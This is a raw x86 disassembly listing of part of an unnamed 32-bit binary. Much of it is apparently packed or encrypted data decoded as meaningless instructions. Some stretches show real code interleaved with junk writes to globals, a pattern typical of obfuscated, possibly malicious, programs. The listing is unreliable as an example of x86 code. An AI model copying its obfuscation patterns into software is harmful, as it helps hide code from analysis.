  4090b1:	fwait
  4090b2:	clc    
  4090b3:	and    ah,BYTE PTR gs:[ecx+0x2d]
  4090b7:	push   bx
  4090b9:	pop    ecx
  4090ba:	(bad)  
  4090bb:	call   0x2d98:0x775dfc09
  4090c2:	in     eax,0x28
  4090c4:	adc    esi,DWORD PTR [edx+ecx*4+0x7a]
  4090c8:	push   0x7c3e358e
  4090cd:	test   eax,0xe7ad8007
  4090d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090d3:	jb     0x409123
  4090d5:	mov    ebx,DWORD PTR [esi-0x11]
  4090d8:	retw   0xf7e
  4090dc:	mov    eax,0xc13c5161
  4090e1:	xor    eax,0x83c61fc2
  4090e6:	jo     0x409087
  4090e8:	out    dx,eax
  4090e9:	sub    DWORD PTR [edi-0x65e76bef],esp
  4090ef:	je     0x409141
  4090f1:	sub    eax,0xed26761b
  4090f6:	iret   
  4090f7:	arpl   sp,cx
  4090f9:	dec    edx
  4090fa:	dec    edx
  4090fb:	push   edx
  4090fc:	fdiv   QWORD PTR ds:0x90aac5ff
  409102:	div    DWORD PTR [ecx+0x4eb4a176]
  409108:	and    al,0x70
  40910a:	cmp    dh,BYTE PTR [edx+eax*2-0x47bc8e09]
  409111:	inc    ebx
  409112:	in     al,dx
  409113:	sbb    DWORD PTR ds:0x6e40c67d,esi
  409119:	pop    edi
  40911a:	jnp    0x409124
  40911c:	ins    BYTE PTR es:[edi],dx
  40911d:	xchg   DWORD PTR [eax+0x3ab15e9b],edi
  409123:	sbb    cl,bl
  409125:	rcl    BYTE PTR ds:0xb28702f,cl
  40912b:	mov    dh,BYTE PTR ds:0xf89c9c61
  409131:	inc    edi
  409132:	call   0x3064:0xc81c9df0
  409139:	sub    BYTE PTR [edx+0x397edad],al
  40913f:	pop    esi
  409140:	aaa    
  409141:	add    ch,BYTE PTR [ecx+0x43]
  409144:	gs jl  0x4090f8
  409147:	mov    ebp,0x722184e
  40914c:	xchg   esi,eax
  40914d:	and    eax,0xc76f8f8d
  409152:	icebp  
  409153:	push   edi
  409154:	jp     0x4090fa
  409156:	dec    edi
  409157:	inc    edi
  409158:	cmp    eax,0xc77f9305
  40915d:	xchg   esp,eax
  40915e:	imul   edx,esp,0xffffffa8
  409161:	fidiv  WORD PTR [esi]
  409163:	mov    al,ds:0xf239cba2
  409168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409169:	ret    0x2eb1
  40916c:	fdiv   QWORD PTR [eax]
  40916e:	test   al,0x3
  409170:	dec    ecx
  409171:	mov    dh,0x4a
  409173:	inc    esi
  409174:	xchg   ebx,eax
  409175:	cmp    esi,DWORD PTR [ebx-0x24]
  409178:	jle    0x409188
  40917a:	mov    ah,0x12
  40917c:	ins    BYTE PTR es:[edi],dx
  40917d:	jmp    0x48df88d1
  409182:	mov    esp,0xc3286b0f
  409187:	in     eax,dx
  409188:	xlat   BYTE PTR ds:[ebx]
  409189:	ins    DWORD PTR es:[edi],dx
  40918a:	out    dx,al
  40918b:	mov    edx,DWORD PTR [edx]
  40918d:	and    dh,BYTE PTR [ecx]
  40918f:	stc    
  409190:	mov    ch,0x92
  409192:	cs sub al,0xbf
  409195:	dec    eax
  409196:	mov    ch,0x5b
  409198:	mov    edi,0x1a11248b
  40919d:	out    0x2e,eax
  40919f:	mov    esi,0x8f2fc636
  4091a4:	sbb    al,0x86
  4091a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091a7:	enter  0x89ef,0xf8
  4091ab:	sub    DWORD PTR ds:0x8c37e685,edi
  4091b1:	xchg   esp,eax
  4091b2:	out    dx,eax
  4091b3:	mov    ch,0x5e
  4091b5:	xchg   edx,eax
  4091b6:	imul   edx,DWORD PTR [esi],0xffffffb3
  4091b9:	mov    dh,0xb
  4091bb:	jns    0x4091f6
  4091bd:	pop    esi
  4091be:	test   cl,dh
  4091c0:	mov    ecx,DWORD PTR [edi-0x71]
  4091c3:	lds    ebx,FWORD PTR [ecx-0x61d0918b]
  4091c9:	int3   
  4091ca:	mov    eax,ds:0x373fcf58
  4091cf:	mov    bh,BYTE PTR [ebp-0x399d7060]
  4091d5:	adc    al,0x66
  4091d7:	int3   
  4091d8:	cmp    al,0x83
  4091da:	fstp   QWORD PTR [eax+0x8b2e8b4]
  4091e0:	add    eax,0xd42551c3
  4091e5:	xchg   edi,eax
  4091e6:	sub    eax,0x8879f565
  4091eb:	xor    eax,0xec7fb448
  4091f0:	cmp    DWORD PTR [ebx+0x2b],esi
  4091f3:	loope  0x40918b
  4091f5:	xor    al,0x14
  4091f7:	jo     0x4091d1
  4091f9:	stc    
  4091fa:	or     eax,0xbaadc6be
  4091ff:	leave  
  409200:	lds    eax,FWORD PTR [ecx+0x1ae74352]
  409206:	xor    DWORD PTR [ebx],edx
  409208:	jmp    0xca427fe7
  40920d:	ret    
  40920e:	repnz ins BYTE PTR es:[edi],dx
  409210:	dec    eax
  409211:	xor    eax,0xd2f915bf
  409216:	cld    
  409217:	sbb    esp,DWORD PTR [ebx+0x35]
  40921a:	(bad)  [eax]
  40921c:	out    dx,eax
  40921d:	push   edi
  40921e:	imul   eax,DWORD PTR [ebx],0xffffffdf
  409221:	dec    ecx
  409222:	xchg   edx,eax
  409223:	in     al,0x78
  409225:	test   al,0xe3
  409227:	cmp    eax,0x9a99e07e
  40922c:	cmp    DWORD PTR [ebp+0x5180f63f],esi
  409232:	pop    esp
  409233:	pop    edx
  409234:	sub    DWORD PTR ds:[eax],ebx
  409237:	shl    esi,cl
  409239:	inc    edx
  40923a:	mov    edx,ecx
  40923c:	sar    DWORD PTR [esi+0x623ea544],cl
  409242:	fdivr  DWORD PTR ds:0x9efa0d78
  409248:	cwde   
  409249:	aam    0xde
  40924b:	mov    ah,0x38
  40924d:	mov    ecx,0x44153819
  409252:	aaa    
  409253:	mov    edx,0x4369f2c5
  409258:	push   ecx
  409259:	adc    dh,BYTE PTR [ebx-0x1bd15d30]
  40925f:	add    DWORD PTR [esi-0x4182e027],ecx
  409265:	out    0x17,eax
  409267:	int3   
  409268:	push   edx
  409269:	les    edx,FWORD PTR [ecx]
  40926b:	mov    al,0x7b
  40926d:	stos   DWORD PTR es:[edi],eax
  40926e:	lods   eax,DWORD PTR ds:[esi]
  40926f:	jp     0x4092c9
  409271:	mov    al,0xd2
  409273:	cmp    ah,bl
  409275:	test   eax,0xb28069d8
  40927a:	cmc    
  40927b:	and    BYTE PTR [edi-0xb6d8d79],bh
  409281:	add    ecx,DWORD PTR [edx+0x421cd5e6]
  409287:	mov    esi,0xa694aeb
  40928c:	retf   0xd248
  40928f:	stc    
  409290:	jo     0x4092c6
  409292:	lock std 
  409294:	or     eax,0xe2435399
  409299:	push   eax
  40929a:	adc    edx,DWORD PTR [edx]
  40929c:	jbe    0x409315
  40929e:	inc    ecx
  40929f:	mov    dl,0xa9
  4092a1:	imul   ebx,DWORD PTR [ecx],0x34
  4092a4:	repz sbb eax,0xacc9b7ff
  4092aa:	mov    al,ds:0xaee8d58b
  4092af:	cmc    
  4092b0:	scas   eax,DWORD PTR es:[edi]
  4092b1:	sahf   
  4092b2:	repz fs dec si
  4092b6:	adc    BYTE PTR [eax-0x5f097f25],dh
  4092bc:	jb     0x40926d
  4092be:	and    ebx,ebp
  4092c0:	xor    DWORD PTR ds:0xc14659ca,0xcf3a2191
  4092ca:	test   dl,cl
  4092cc:	sub    al,0xad
  4092ce:	xor    edi,esi
  4092d0:	call   0x15b3:0xb249868
  4092d7:	mov    esi,0x75339134
  4092dc:	push   eax
  4092dd:	mov    BYTE PTR [edx],bl
  4092df:	imul   edx,eax,0x76
  4092e2:	fisttp QWORD PTR [esp+ecx*8+0x53]
  4092e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092e7:	sahf   
  4092e8:	mov    dl,0x9f
  4092ea:	fwait
  4092eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092ec:	mov    al,ds:0x4cc2d4b7
  4092f1:	shr    DWORD PTR fs:[esi],cl
  4092f4:	push   cs
  4092f5:	inc    edi
  4092f6:	mov    edi,0x1b4af709
  4092fb:	adc    ch,0x4f
  4092fe:	add    eax,0xe6791d6a
  409303:	outs   dx,DWORD PTR ss:[esi]
  409305:	sbb    DWORD PTR ss:[edx],ecx
  409308:	out    dx,eax
  409309:	mov    gs,WORD PTR [ebx-0x51a7e413]
  40930f:	xchg   esp,eax
  409310:	and    ah,BYTE PTR [ecx]
  409312:	fild   QWORD PTR [ebx]
  409314:	and    DWORD PTR [edi-0x2b],ecx
  409317:	iret   
  409318:	pop    ds
  409319:	pop    ebx
  40931a:	sbb    ebp,DWORD PTR [ebp-0x59]
  40931d:	shl    DWORD PTR [ebx],cl
  40931f:	sbb    ah,BYTE PTR [edx-0x3c]
  409322:	cmp    ebx,DWORD PTR [ebp+0x2a]
  409325:	aas    
  409326:	in     al,dx
  409327:	or     eax,ebp
  409329:	dec    ebp
  40932a:	pop    esi
  40932b:	jns    0x409304
  40932d:	in     eax,0xf3
  40932f:	(bad)  
  409330:	mov    al,0x84
  409332:	adc    DWORD PTR [esi+eax*2+0x3a],eax
  409336:	call   0x9389335c
  40933b:	mov    dl,0x5c
  40933d:	ss lock push ebp
  409340:	xchg   esi,eax
  409341:	mov    eax,DWORD PTR [ebp-0x14]
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x4336e3
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	les    esi,FWORD PTR [ebx]
  40939d:	or     bl,bl
  40939f:	pop    ebp
  4093a0:	sahf   
  4093a1:	in     eax,dx
  4093a2:	jl     0x409420
  4093a4:	adc    eax,0xab7c7c7f
  4093a9:	ds retf 
  4093ab:	out    dx,al
  4093ac:	out    dx,al
  4093ad:	mov    bh,0xbf
  4093af:	es push 0xffffffb1
  4093b2:	shl    DWORD PTR [esp-0x1a],cl
  4093b6:	es or  al,0x93
  4093b9:	push   es
  4093ba:	out    dx,al
  4093bb:	adc    BYTE PTR [ecx-0x70],dl
  4093be:	sti    
  4093bf:	sub    cl,BYTE PTR [edi-0x65bcb11f]
  4093c5:	dec    esi
  4093c6:	outs   dx,BYTE PTR ds:[esi]
  4093c7:	or     DWORD PTR [edx-0x15],esp
  4093ca:	out    dx,al
  4093cb:	(bad)  [eax-0x5340cd9e]
  4093d1:	cmp    eax,0xe8392410
  4093d6:	into   
  4093d7:	pop    esi
  4093d8:	jge    0x4093cf
  4093da:	cmp    eax,0x7bf58e1f
  4093df:	cmp    al,0x77
  4093e1:	sahf   
  4093e2:	pop    esi
  4093e3:	cs cli 
  4093e5:	and    eax,0xe6b1a3e
  4093eb:	ja     0x409397
  4093ed:	cwde   
  4093ee:	sar    BYTE PTR [esi-0x36],1
  4093f1:	outs   dx,DWORD PTR ds:[esi]
  4093f2:	mov    ah,0x98
  4093f4:	imul   ebp,DWORD PTR [edx+eax*8],0xffffffe3
  4093f8:	(bad)  
  4093f9:	fistp  WORD PTR [ebx+0x54931681]
  4093ff:	icebp  
  409400:	inc    ebx
  409401:	inc    esp
  409402:	retf   
  409403:	sar    DWORD PTR [eax+0x41],0xad
  409407:	jnp    0x409418
  409409:	shl    BYTE PTR [eax+0x75],1
  40940c:	stos   BYTE PTR es:[edi],al
  40940d:	nop
  40940e:	xor    al,0x7b
  409410:	jl     0x40943a
  409412:	and    esp,DWORD PTR [edi-0x3a06d2a2]
  409418:	icebp  
  409419:	das    
  40941a:	cmp    edx,ebx
  40941c:	mov    al,0x5f
  40941e:	jns    0x40948f
  409420:	icebp  
  409421:	mov    ah,ah
  409423:	fxch   st(2)
  409425:	push   esi
  409426:	push   esi
  409427:	xchg   ebp,eax
  409428:	popf   
  409429:	xor    DWORD PTR [ebp-0x63],ebp
  40942c:	xchg   esi,eax
  40942d:	pop    eax
  40942e:	into   
  40942f:	pusha  
  409430:	push   0xfffffff0
  409432:	mov    ebx,0x979b3495
  409437:	hlt    
  409438:	je     0x4093d6
  40943a:	dec    ebp
  40943b:	in     al,0xd3
  40943d:	mov    esp,0xca1e0224
  409442:	push   ecx
  409443:	inc    edi
  409444:	pop    esi
  409445:	cdq    
  409446:	shr    dh,0x7a
  409449:	xor    DWORD PTR [ecx-0x4f045073],ebp
  40944f:	clc    
  409450:	push   ds
  409451:	(bad)  
  409452:	dec    esp
  409453:	jmp    0x584f:0x7579f2d6
  40945a:	and    ebp,DWORD PTR [eax+0x61703505]
  409460:	aaa    
  409461:	cli    
  409462:	adc    DWORD PTR [ecx],eax
  409464:	dec    esp
  409465:	aam    0xc7
  409467:	jmp    0x4094ae
  409469:	inc    eax
  40946a:	or     al,cl
  40946c:	stos   BYTE PTR es:[edi],al
  40946d:	adc    eax,0x3a1dc344
  409472:	xchg   BYTE PTR [esi+0x19],bh
  409475:	or     eax,0x65251c28
  40947a:	fimul  DWORD PTR [edx-0xd]
  40947d:	mov    ebp,0x3f6367dc
  409482:	sbb    dh,dl
  409484:	cli    
  409485:	pop    es
  409486:	ss inc esp
  409488:	dec    esp
  409489:	stos   DWORD PTR es:[edi],eax
  40948a:	xor    BYTE PTR [ebp-0x3f],ah
  40948d:	xchg   esi,eax
  40948e:	mov    al,0x36
  409490:	mov    ah,0x8
  409492:	dec    ebp
  409493:	jmp    0x46e6:0xe28a56d5
  40949a:	addr16 cdq 
  40949c:	je     0x40949d
  40949e:	pop    ecx
  40949f:	mov    bh,0x57
  4094a1:	imul   ecx,DWORD PTR ds:0x7c2e1e41,0x69
  4094a8:	pop    ecx
  4094a9:	stos   BYTE PTR es:[edi],al
  4094aa:	dec    edi
  4094ab:	ins    DWORD PTR es:[edi],dx
  4094ac:	adc    eax,0x861b6b13
  4094b1:	mov    DWORD PTR cs:[ebx+0x68],edx
  4094b5:	aaa    
  4094b6:	retf   0xcf6c
  4094b9:	sbb    al,0x5f
  4094bb:	pop    edx
  4094bc:	inc    ecx
  4094bd:	and    eax,0x8458bd7
  4094c2:	or     DWORD PTR ds:0x4336e7,0xc38
  4094cc:	push   ebx
  4094cd:	adc    DWORD PTR ds:0x433657,0x6147
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x433767,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x43365f,0x433657
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x43375f,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x4336ab,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x43365b,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x4336af,0x43376b
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x4336af,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x433667,0x43372f
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433697,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x4336ef,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x43376b,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x433663,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x43372f,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x43364b,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	inc    ecx
  4095c2:	mov    WORD PTR ds:0x7cecb711,?
  4095c8:	jl     0x4095df
  4095ca:	jg     0x409648
  4095cc:	jl     0x40955d
  4095ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095cf:	mov    ds:0x49f7c38a,al
  4095d4:	leave  
  4095d5:	dec    ebx
  4095d6:	dec    ebx
  4095d7:	test   eax,0x8bab7bee
  4095dc:	cmp    eax,ebp
  4095de:	mov    ebx,DWORD PTR [edx-0x683b6a98]
  4095e4:	mov    eax,0xa4e81aa5
  4095e9:	pop    ecx
  4095ea:	jb     0x4095a4
  4095ec:	xchg   DWORD PTR [ebx+eiz*4+0x4f434421],eax
  4095f3:	call   0x969b:0x2699a742
  4095fa:	mov    ch,0x34
  4095fc:	adc    bh,ah
  4095fe:	inc    ebp
  4095ff:	adc    BYTE PTR [ebp-0x16acbbe8],0x90
  409606:	xchg   esi,eax
  409607:	push   esp
  409608:	fimul  WORD PTR [eax]
  40960a:	or     al,0x90
  40960c:	std    
  40960d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40960e:	arpl   WORD PTR es:[ecx+edi*8+0x2e],di
  409613:	bound  eax,QWORD PTR [ebp-0x42]
  409616:	dec    esi
  409617:	and    BYTE PTR [ecx+0x72c41b4f],dh
  40961d:	aam    0x16
  40961f:	push   0x8f93d5bb
  409624:	inc    edx
  409625:	pop    ebx
  409626:	mov    al,0x96
  409628:	imul   ebp,DWORD PTR [edi-0x76],0x535d2258
  40962f:	pop    edx
  409630:	retf   0xde52
  409633:	gs (bad) 
  409635:	shl    DWORD PTR [eax],1
  409637:	fwait
  409638:	(bad)
  40963c:	iret   
  40963d:	lods   eax,DWORD PTR ds:[esi]
  40963e:	sar    DWORD PTR [esi],cl
  409640:	xor    BYTE PTR [edi-0x30],ch
  409643:	or     eax,edx
  409645:	inc    eax
  409646:	mov    DWORD PTR [edx-0x9],0x58d00c1a
  40964d:	mov    bl,BYTE PTR [edx-0x7]
  409650:	rcl    DWORD PTR [edi+0x22],1
  409653:	cmp    eax,0xae084b47
  409658:	dec    ecx
  409659:	xchg   ecx,eax
  40965a:	jg     0x4096ae
  40965c:	aaa    
  40965d:	pop    ss
  40965e:	push   eax
  40965f:	mov    BYTE PTR [edi],bl
  409661:	lock idiv BYTE PTR [ebp+0x1f]
  409665:	ss or  al,0x96
  409668:	dec    ebp
  409669:	cmp    cl,BYTE PTR [edi]
  40966b:	into   
  40966c:	stos   BYTE PTR es:[edi],al
  40966d:	sub    DWORD PTR [edi],ebp
  40966f:	test   BYTE PTR [eax],al
  409671:	jecxz  0x409679
  409673:	ss pop eax
  409675:	pop    ss
  409676:	adc    BYTE PTR [ebx+0x4f],dl
  409679:	cmp    al,0xc1
  40967b:	rcr    esp,0x8a
  40967e:	ss mov edx,0x23516b54
  409684:	push   ebp
  409685:	adc    al,0x2c
  409687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409688:	bound  ebx,QWORD PTR [ecx]
  40968a:	mov    edi,0xd77285c
  40968f:	dec    esp
  409690:	xor    eax,0xfbb25ac7
  409695:	out    0x2a,al
  409697:	sub    BYTE PTR [ebp-0xb],ah
  40969a:	sbb    bh,0x28
  40969d:	adc    al,0xef
  40969f:	lea    edi,[eax-0x45]
  4096a2:	mov    ds:0x547ff8ae,eax
  4096a7:	fadd   DWORD PTR [edi+esi*8+0x62]
  4096ab:	pop    es
  4096ac:	mov    ebx,0xcd9e0533
  4096b1:	jnp    0x40970b
  4096b3:	scas   al,BYTE PTR es:[edi]
  4096b4:	adc    bl,al
  4096b6:	push   ds
  4096b7:	xchg   DWORD PTR [esi-0xd],esp
  4096ba:	mov    ecx,DWORD PTR [eax]
  4096bc:	mul    DWORD PTR [edx]
  4096be:	in     eax,dx
  4096bf:	mov    esp,edi
  4096c1:	test   BYTE PTR [esi],0x7
  4096c4:	test   DWORD PTR [ecx+0x67c7c9cb],0x5e280aeb
  4096ce:	mov    esi,DWORD PTR [esi+0x7cf56e96]
  4096d4:	push   0x363d29e2
  4096d9:	mov    ebx,0xf0ca595c
  4096de:	pop    edi
  4096df:	jae    0x409712
  4096e1:	xchg   edx,eax
  4096e2:	pop    edi
  4096e3:	jns    0x409666
  4096e5:	(bad)  
  4096e6:	cmp    eax,0xc7000003
  4096eb:	add    eax,0x4336d7
  4096f0:	xchg   edi,eax
  4096f1:	add    DWORD PTR [eax],eax
  4096f3:	add    BYTE PTR [edi],cl
  4096f5:	test   DWORD PTR [eax+eax*1+0x0],ebp
  4096f9:	add    BYTE PTR [ebx-0x74fff79b],al
  4096ff:	inc    ebp
  409700:	clc    
  409701:	or     DWORD PTR ds:0x433723,0x4336e3
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x433763
  409714:	or     DWORD PTR ds:0x433723,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x43363f,0x4336af
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x433727,0x4336a7
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x43364b
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433717,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x43365f,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x4336ef,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x433767,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x43363f
  40978d:	and    DWORD PTR ds:0x4336af,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x43372f,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43369f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x4336e7
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x433727,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x43365f,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x4336eb,0x433733
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43371b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x43365f
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x4336b3,0x4336af
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	jmp    0x409840
  409828:	jo     0x409829
  40982a:	dec    esp
  40982b:	out    dx,eax
  40982c:	jl     0x4098aa
  40982e:	adc    eax,0x427c7c7f
  409833:	mov    bl,0x7a
  409835:	cmp    esp,DWORD PTR [ecx-0x5a]
  409838:	adc    eax,0xd59cb9d9
  40983d:	lea    ebx,ds:0x4649d8a8
  409843:	push   ebx
  409844:	out    0x89,al
  409846:	mov    bl,0x47
  409848:	adc    DWORD PTR [edi],0xfffffff0
  40984b:	pop    edi
  40984c:	call   0xb1fdb4c9
  409851:	fwait
  409852:	ret    
  409853:	outs   dx,BYTE PTR ds:[esi]
  409854:	jmp    0x2dd9:0x53ffab40
  40985b:	rcr    BYTE PTR [edx+0x2f61355c],cl
  409861:	loope  0x4098a1
  409863:	dec    esp
  409864:	int    0xf6
  409866:	rol    DWORD PTR [ecx],0xc4
  409869:	jne    0x409837
  40986b:	pop    esi
  40986c:	dec    ebx
  40986d:	ror    edi,cl
  40986f:	outs   dx,BYTE PTR ds:[esi]
  409870:	pushf  
  409871:	cmp    al,0xc7
  409873:	sahf   
  409874:	mov    ebp,0xe59cd3c2
  409879:	push   ecx
  40987a:	mov    eax,ds:0x981928a8
  40987f:	test   DWORD PTR [esi+0xd],0xdea309ac
  409886:	sub    al,0x62
  409888:	rol    DWORD PTR [edi],1
  40988a:	cld    
  40988b:	mov    edx,0xcc6d2d44
  409890:	adc    BYTE PTR [ecx-0x69],ah
  409893:	sahf   
  409894:	lods   al,BYTE PTR ds:[esi]
  409895:	jns    0x4098cc
  409897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409898:	mov    edx,DWORD PTR [eax-0x57981af6]
  40989e:	lods   eax,DWORD PTR ds:[esi]
  40989f:	sbb    cl,BYTE PTR [ecx-0x64c3095b]
  4098a5:	cmp    BYTE PTR [eax+ebx*8+0x6b],dl
  4098a9:	pop    edx
  4098aa:	push   0xffffffdc
  4098ac:	adc    eax,0x1597d17
  4098b1:	lods   al,BYTE PTR ds:[esi]
  4098b2:	or     BYTE PTR [edx*8-0x3b5556c5],bl
  4098b9:	mov    WORD PTR [edi-0x3da06a1c],cs
  4098bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098c0:	jnp    0x4098d8
  4098c2:	in     eax,0xfb
  4098c4:	ins    BYTE PTR es:[edi],dx
  4098c5:	mov    dl,0xab
  4098c7:	sti    
  4098c8:	add    cl,BYTE PTR [ebp+eiz*8+0x4e]
  4098cc:	push   ebx
  4098cd:	fmul   DWORD PTR [esi+0x1]
  4098d0:	or     ecx,0x60
  4098d3:	xor    bl,dh
  4098d5:	cmp    edi,eax
  4098d7:	jmp    0x40986b
  4098d9:	fucomi st,st(5)
  4098db:	cmp    dh,BYTE PTR [esi]
  4098dd:	sbb    ebx,0xfffffff4
  4098e0:	cld    
  4098e1:	cmp    eax,0x4a35852
  4098e6:	in     eax,0xbe
  4098e8:	sbb    BYTE PTR [eax+eax*2-0x7a],cl
  4098ec:	xor    BYTE PTR [ebp-0x49558fdb],cl
  4098f2:	dec    esi
  4098f3:	fmul   st(5),st
  4098f5:	imul   DWORD PTR [esi+0x5f]
  4098f8:	cdq    
  4098f9:	jne    0x40992c
  4098fb:	mov    ds:0x9366e9d,al
  409900:	int3   
  409901:	mov    ebp,esp
  409903:	mov    al,0xd7
  409905:	cmp    ch,dl
  409907:	(bad)  
  409908:	xchg   edi,eax
  409909:	mov    ?,WORD PTR [ecx-0x9]
  40990c:	ret    0xb561
  40990f:	aam    0x52
  409911:	adc    BYTE PTR [ebx],0xf6
  409914:	push   ebx
  409915:	or     eax,0xd059cf2f
  40991a:	cmp    ebp,ebp
  40991c:	stos   DWORD PTR es:[edi],eax
  40991d:	out    dx,al
  40991e:	dec    esp
  40991f:	mov    ebx,0x8eca0e9c
  409924:	adc    al,0x79
  409926:	int3   
  409927:	sub    al,0x3d
  409929:	sbb    dh,BYTE PTR [eax]
  40992b:	shr    DWORD PTR [edi],1
  40992d:	jp     0x4098e3
  40992f:	stos   DWORD PTR es:[edi],eax
  409930:	jno    0x409978
  409932:	test   BYTE PTR [eax+edx*2-0x3b],bl
  409936:	lea    ecx,[ebp+ecx*1-0x44029b9]
  40993d:	pushw  cs
  40993f:	xor    DWORD PTR [eax+0x3],ebp
  409942:	xor    al,0x2b
  409944:	sub    ecx,DWORD PTR [ebp+0x331f10ef]
  40994a:	mov    BYTE PTR [ebx],0xc3
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
